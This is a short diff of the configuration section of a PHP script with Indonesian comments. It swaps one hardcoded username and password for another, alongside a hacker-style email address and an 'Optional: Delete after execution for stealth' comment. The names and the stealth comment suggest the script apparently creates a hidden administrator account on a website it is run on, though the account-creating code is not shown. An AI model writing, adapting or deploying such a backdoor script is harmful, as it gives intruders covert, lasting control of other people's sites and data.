@@ -10,8 +10,8 @@
 // ============================================
 // CONFIGURATION - EDIT THIS
 // ============================================
-$new_username = 'bastian13';        // Username baru
-$new_password = 'indohaxsec1337'; // Password baru
+$new_username = 'adminz';        // Username baru
+$new_password = 'idnsec1337'; // Password baru
 $new_email    = 'haxorsecv1@gmail.com'; // Email
 
 // Optional: Delete after execution for stealth
